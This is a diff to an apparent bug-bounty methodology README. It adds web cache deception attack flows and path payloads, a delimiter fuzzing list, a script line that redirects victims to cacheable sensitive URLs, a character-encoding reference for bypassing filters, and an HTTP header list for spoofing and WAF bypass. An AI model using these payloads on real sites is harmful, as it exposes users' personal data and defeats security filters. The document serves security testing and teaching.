@@ -360,7 +360,7 @@ Now that you've run through the basics, dive into the full methodology below. Ea
 | 4.11 | ↳ [Deserialization](#411-insecure-deserialization) | Java · PHP · Python · .NET · Ruby |
 | 4.12 | ↳ [Prototype Pollution](#412-prototype-pollution) | Client-Side · Server-Side · Node.js |
 | 4.13 | ↳ [HTTP Smuggling](#413-http-request-smuggling) | CL.TE · TE.CL · H2.CL · TE.TE |
-| 4.14 | ↳ [Cache Poisoning](#414-web-cache-poisoning--deception) | Unkeyed Headers · Web Cache Deception |
+| 4.14 | ↳ [Cache Poisoning & Deception](#414-web-cache-poisoning--deception) | Poison · WCD (35+ Delimiters) · Sensitive Paths |
 | 4.15 | ↳ [Race Conditions](#415-race-conditions--toctou) | Single-Packet · TOCTOU · Rate Limit Bypass |
 | 4.16 | ↳ [Business Logic](#416-business-logic-flaws) | Coupon · Price · Quantity · Payment · Trial |
 | 4.17 | ↳ [Open Redirect](#417-open-redirect) | 12 Bypass Techniques · OAuth Chaining |
@@ -392,6 +392,8 @@ Now that you've run through the basics, dive into the full methodology below. Ea
 | 5 | [Hunting Mindset](#5-hunting-mindset--methodology) | Strategy · Prioritization · Pivoting |
 | 6 | [POC Creation](#6-proof-of-concept-poc-creation) | Screenshots · Scripts · Automation · Evidence |
 | 7 | [Reporting](#7-reporting) | Professional Write-ups |
+| 8 | [Obfuscation Payloads](#8-obfuscation-payloads--universal-bypass-reference) | Encoding Reference — Quotes · Brackets · Chains |
+| 9 | [HTTP Headers](#9-http-headers-reference) | Security · Cache · CORS · Forwarding · Bypass |
 
 ---
 
@@ -2102,9 +2104,14 @@ python3 smuggler.py -u https://target.com
 
 ### **4.14 Web Cache Poisoning & Deception**
 
+> **Cache Poisoning** = injecting malicious content into the cache that's served to other users.
+> **Web Cache Deception** = tricking the cache into storing sensitive pages as static files.
+
 **🛠️ Tools:** [Param Miner](https://github.com/PortSwigger/param-miner) (Burp)
 
-**Unkeyed Header Injection — Poison the Cache**
+#### **4.14A — Cache Poisoning (Inject Content into Cache)**
+
+**Unkeyed Header Injection**
 ```bash
 # If these headers are NOT part of the cache key but ARE reflected:
 X-Forwarded-Host: evil.com       # Poisoned: redirects, script src, stylesheet href
@@ -2122,15 +2129,58 @@ GET /path%3B/admin HTTP/1.1
 GET //path/../admin HTTP/1.1
 ```
 
-**Web Cache Deception (WCD)**
+**How to confirm:**
 ```bash
-# Attach fake static extension to sensitive URL
-GET /account/profile.css HTTP/1.1
-GET /api/me/orders.json HTTP/1.1
-GET /settings/nonexistent.js HTTP/1.1
+# 1. Send request with unkeyed header
+# 2. Check X-Cache: miss → hit on self-request
+# 3. Open in incognito → cached response served to anonymous user
+```
 
-# If CDN caches the response as a static file...
-# Attacker visits: https://target.com/account/profile.css → sees victim's profile
+#### **4.14B — Web Cache Deception (Steal Sensitive Data from Cache)**
+
+**How it works:** Attach a static file extension (`.css`, `.js`, `.png`) to a sensitive URL. The cache stores the response as a static file, then the attacker visits the URL and sees the victim's data.
+
+**Attack Flow:**
+```bash
+# Victim visits (via phishing/script):
+GET /my-account.css HTTP/1.1
+# Cache sees ".css" → caches as static resource
+# Response contains victim's PII
+
+# Attacker visits:
+GET /my-account.css HTTP/1.1
+# Cache serves cached response → attacker sees victim's data
+```
+
+**WCD Payloads — Delimiter + Extension**
+```bash
+# Path delimiter attacks (try ALL delimiters):
+/my-account<DELIMITER>foo.css
+/resources/../my-account
+/resources/..%2fmy-account?foo.js
+/my-account%23%2f%2e%2e%2fresources/foo.js
+/my-account;%2f%2e%2e%2frobots.txt?wcd
+
+# Trigger via script:
+<script>document.location="https://target.com/my-account/foo.js";</script>
+```
+
+**WCD Delimiter List (Burp Intruder):**
+```
+!  "  #  $  %  &  '  (  )  *  +  ,  -  .  /  :  ;  <  =  >  ?  @  [  \  ]  ^  _  `  {  |  }  ~
+%21 %22 %23 %24 %25 %26 %27 %28 %29 %2A %2B %2C %2D %2E %2F %3A %3B %3C %3D %3E %40 %5B %5C %5D %5E %5F %60 %7B %7C %7D %7E
+```
+
+**Common sensitive paths to target:**
+```bash
+/my-account
+/profile
+/api/me
+/settings
+/admin/dashboard
+/cart
+/orders
+/billing
 ```
 
 ---
@@ -4533,5 +4583,153 @@ Ask yourself before writing the report:
 <br>
 
 
-## 📄 License
+---
+
+<br>
+
+## **8. Obfuscation Payloads — Universal Bypass Reference**
+
+> When the server blocks your payload, try these alternate encodings in Burp Intruder.
+
+### **Single Quote `'`**
+```
+'  0x27  &#39;  &#x27;  &apos;  %27  \x27  \u0027  %u0027  %2527  %%327
+```
+
+### **Double Quote `"`**
+```
+"  0x22  &#34;  &#x22;  &quot;  %22  \x22  \u0022  %u0022  %2522  %%322
+```
+
+### **Backslash `\`**
+```
+\  0x5C  &#92;  &#x5C;  %5C  \x5C  \u005C  %u005C  %255C  %%35C
+```
+
+### **Less Than `<`**
+```
+<  0x3C  &#60;  &#x3C;  &lt;  %3C  \x3C  \u003C  %u003C  %253C
+```
+
+### **Greater Than `>`**
+```
+>  0x3E  &#62;  &#x3E;  &gt;  %3E  \x3E  \u003E  %u003E  %253E
+```
+
+### **Space**
+```
+%20  %09 (tab)  %0a (newline)  %0d (carriage return)  +  /**/  %00
+```
+
+### **Newline / CRLF**
+```
+%0a  %0d  %0d%0a  \n  \r  \r\n
+```
+
+### **Comment Injection (SQL/JS)**
+```
+/**/  --   #  <!--  /*!*/  /*!50000*/
+```
+
+### **Common Encoding Chains**
+```bash
+# Double URL encoding
+%253C  →  %3C  →  <
+
+# Unicode escapes
+\u003C → <
+
+# HTML entity → URL encoding
+%26lt%3B → &lt; → <
+
+# Base64
+PA== → <   |   Pg== → >
+Jw== → '   |   Ig== → "
+
+# Hex (0x prefix)
+0x3C → <
+
+# Backtick (template literal)
+` → sometimes passes filters that block '
+```
+
+---
+
+<br>
+
+## **9. HTTP Headers Reference**
+
+> Keep this handy when crafting attacks. These headers control security, caching, and routing.
+
+### **Core Headers**
+```
+Host                 → Server domain (manipulate for SSRF, password reset poisoning)
+Referer              → Previous page (spoof for CSRF bypass)
+Location             → Redirect target (CRLF injection point)
+Content-Type         → Determines how body is parsed (switch to confuse parser)
+Content-Length       → Body size (manipulate for request smuggling)
+Transfer-Encoding    → Chunked encoding (manipulate for request smuggling)
+```
+
+### **Forwarding / IP Spoofing**
+```
+X-Forwarded-For      → Client IP behind proxy
+X-Forwarded-Host     → Original Host header
+X-Forwarded-Port     → Original port
+X-Forwarded-Proto    → Original protocol
+X-Forwarded-Scheme   → Original scheme
+X-Real-IP            → Real client IP
+X-Client-IP          → Client IP
+X-Remote-IP          → Remote IP
+X-Remote-Addr        → Remote address
+X-Originating-IP     → Originating IP
+X-Custom-IP-Authorization → Custom auth IP
+True-Client-IP       → True client IP (Cloudflare)
+```
+
+### **Cache Control**
+```
+Vary                 → Which headers are part of cache key
+Cache-Control        → Caching directives (no-cache, public, max-age, s-maxage)
+Pragma               → Legacy no-cache (HTTP/1.0)
+X-Cache              → Cache status (hit/miss/dynamic/refresh)
+Age                  → Seconds since cached
+```
+
+### **CORS Headers**
+```
+Origin                              → Request origin
+Access-Control-Allow-Origin         → Allowed origin (check for *, null, reflected)
+Access-Control-Allow-Credentials    → If true + reflected origin = exploitable
+Access-Control-Expose-Headers       → Headers exposed to JS
+Access-Control-Allow-Methods        → Allowed HTTP methods
+Access-Control-Max-Age              → Preflight cache duration
+```
+
+### **Security Headers (check for missing/weak)**
+```
+Content-Security-Policy        → CSP (check for unsafe-inline, unsafe-eval, missing base-uri)
+X-Frame-Options                → Clickjacking protection (DENY, SAMEORIGIN, ALLOW-FROM)
+X-Content-Type-Options         → MIME sniffing (should be nosniff)
+Strict-Transport-Security      → HSTS (should be max-age=31536000; includeSubDomains)
+X-XSS-Protection               → Legacy XSS filter (often 0 to disable)
+Set-Cookie                     → Check for Secure, HttpOnly, SameSite flags
+```
+
+### **Method & Path Override**
+```
+X-HTTP-Method-Override    → Override HTTP method
+X-HTTP-Method             → Alternative method
+X-Method-Override         → Another variant
+X-Original-URL            → Original URL (WAF bypass)
+X-Rewrite-URL             → Rewrite URL (content switch)
+```
+
+### **Version & Technology**
+```
+X-Powered-By             → Server technology (PHP/X-Powered-By: PHP/7.4)
+Server                   → Web server (Apache/2.4.41, nginx/1.18)
+X-AspNet-Version         → ASP.NET version
+X-Generator              → CMS (Drupal, WordPress)
+```
 MIT License — Hack responsibly. Share knowledge. Build the community.
